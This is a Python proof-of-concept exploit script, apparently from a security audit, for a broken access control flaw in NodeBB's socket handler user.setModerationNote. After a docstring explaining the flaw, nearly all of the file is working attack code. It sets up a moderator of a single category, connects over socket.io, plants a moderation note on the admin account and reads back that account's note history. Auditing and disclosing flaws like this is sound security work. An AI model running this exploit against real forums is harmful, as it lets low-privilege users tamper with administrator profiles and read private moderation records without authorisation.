#!/usr/bin/env python3
"""
VULN-014 — Socket user.setModerationNote broken access control (any cat-mod -> any user, incl. admins)
=====================================================================================================

Vulnerable code (targets/NodeBB/):
  * src/socket.io/user.js:145-154  canEdit fallback = user.isModeratorOfAnyCategory(socket.uid)

Vulnerability class: CWE-639 / CWE-284 (broken access control / horizontal privesc + info disclosure).

Flaw (plain English):
  setModerationNote gates writes with privileges.users.canEdit(caller, target), which protects admin
  targets via `!isTargetAdmin`. But when canEdit is false it falls back to
  `user.isModeratorOfAnyCategory(socket.uid)` — a GLOBAL "is this caller a mod of anything" test that
  IGNORES the target. So a moderator of ANY single category passes the check for ANY target, which (a)
  defeats the admin-target protection (notes can be planted on admin profiles) and (b) returns the
  target's ENTIRE moderation-note history to the caller.

Exploitation idea:
  Create a user who moderates ONE ordinary category (not global-mod, not admin). Over their socket,
  call user.setModerationNote on uid 1 (the admin). It should succeed, plant a note on the admin, and
  return the admin's full moderation-note history.

What a successful run proves:
  A single-category moderator writes a moderation note onto the ADMIN's profile and reads back the
  admin's note history — neither of which canEdit would permit (target is admin).
"""
import os
import sys
import secrets
from urllib.parse import quote
import requests
import socketio

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21372")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "NodeBB-Adm1n-Sec2026!")
MOD_CID = int(os.environ.get("MOD_CID", "2"))     # an ordinary category to make our user a moderator of
TARGET_UID = int(os.environ.get("TARGET_UID", "1"))   # the admin
TIMEOUT = 10
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


def session_for(user, pw):
    s = requests.Session()
    s.headers["User-Agent"] = BROWSER_UA
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    s.post(f"{BASE_URL}/login", headers={"x-csrf-token": csrf},
           data={"username": user, "password": pw}, timeout=TIMEOUT).raise_for_status()
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    return s, csrf


def connect_socket(s, csrf):
    cookie = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())
    sio = socketio.Client(reconnection=False)
    sio.connect(f"{BASE_URL}?_csrf={quote(csrf)}",
                headers={"User-Agent": BROWSER_UA, "Origin": BASE_URL, "Cookie": cookie, "x-csrf-token": csrf},
                wait_timeout=12)
    return sio


def call(sio, event, data):
    try:
        res = sio.call(event, data, timeout=TIMEOUT)
    except Exception as e:  # noqa: BLE001
        return {"transport_error": repr(e)}
    if isinstance(res, (list, tuple)) and len(res) == 2:
        return {"err": res[0], "result": res[1]}
    return {"raw": res}


def main():
    print("=" * 78)
    print("VULN-014: Socket user.setModerationNote broken access control")
    print(f"Target: {BASE_URL}")
    print("=" * 78)
    log("INFO", "canEdit fallback isModeratorOfAnyCategory ignores the target (src/socket.io/user.js:147)")

    suffix = secrets.token_hex(4)
    mod_user = f"catmod_{suffix}"
    mod_pass = f"Pw-{secrets.token_hex(8)}!"
    note_text = f"PLANTED_BY_{mod_user}_{secrets.token_hex(3)}"

    admin, acsrf = session_for(ADMIN_USER, ADMIN_PASS)
    ahdr = {"x-csrf-token": acsrf, "Content-Type": "application/json"}

    # ---- setup: create a low-priv user and make them a moderator of ONE ordinary category ----
    log("SETUP", f"creating user {mod_user}")
    r = admin.post(f"{BASE_URL}/api/v3/users", headers=ahdr,
                   json={"username": mod_user, "password": mod_pass}, timeout=TIMEOUT)
    if r.status_code not in (200, 201):
        log("FAIL", f"user create failed: {r.status_code} {r.text[:150]}")
        sys.exit(1)
    mod_uid = r.json()["response"]["uid"]
    log("SETUP", f"created uid={mod_uid}; granting 'moderate' on cid {MOD_CID} (single category only)")
    r = admin.put(f"{BASE_URL}/api/v3/categories/{MOD_CID}/privileges/moderate", headers=ahdr,
                  json={"member": mod_uid}, timeout=TIMEOUT)
    if r.status_code not in (200, 201):
        log("FAIL", f"privilege grant failed: {r.status_code} {r.text[:150]}")
        sys.exit(1)
    log("SETUP", f"{mod_user} is now a moderator of cid {MOD_CID} only (NOT global-mod, NOT admin)")

    # ---- exploit: as that moderator, plant + read a note on the ADMIN (uid 1) over the socket ----
    s, csrf = session_for(mod_user, mod_pass)
    who = s.get(f"{BASE_URL}/api/self", timeout=TIMEOUT).json()
    log("INFO", f"moderator session: uid={who.get('uid')} isAdmin={who.get('isAdmin')} "
                f"isGlobalMod={who.get('isGlobalModerator')} (both must be False for a valid test)")
    sio = connect_socket(s, csrf)
    log("STEP", f"emit user.setModerationNote {{uid:{TARGET_UID}, note:'{note_text}'}} (target is the admin)")
    ack = call(sio, "user.setModerationNote", {"uid": TARGET_UID, "note": note_text})
    sio.disconnect()
    log("INFO", f"ack: {ack}")

    print("-" * 78)
    # Success = no error AND the returned target note history contains our planted note.
    err = ack.get("err")
    result = ack.get("result")
    notes_blob = str(result)
    planted = (err is None) and (note_text in notes_blob)
    not_privileged = (not who.get("isAdmin")) and (not who.get("isGlobalModerator"))

    if planted and not_privileged:
        log("PROOF", f"a single-category moderator (uid {mod_uid}, not admin/global-mod) wrote note "
                     f"'{note_text}' onto the ADMIN (uid {TARGET_UID}) and read back the admin's note history "
                     "-> canEdit's !isTargetAdmin protection defeated via the isModeratorOfAnyCategory fallback")
        log("OK", "exploit confirmed — broken access control on user.setModerationNote")
        v = "==> VULN-014: CONFIRMED — any category moderator can plant/read moderation notes on any user (incl. admins)"
        print(f"\033[1;32m{v}\033[0m" if _USE_COLOR else v)
        sys.exit(0)

    if not not_privileged:
        log("FAIL", "the test user ended up privileged (admin/global-mod) — test invalid")
    if err is not None:
        log("FAIL", f"handler returned an error: {err}")
    elif note_text not in notes_blob:
        log("FAIL", "note not found in returned history")
    v = "==> VULN-014: FAILED — setModerationNote did not permit the cross-target write/read"
    print(f"\033[1;31m{v}\033[0m" if _USE_COLOR else v)
    sys.exit(1)


if __name__ == "__main__":
    main()
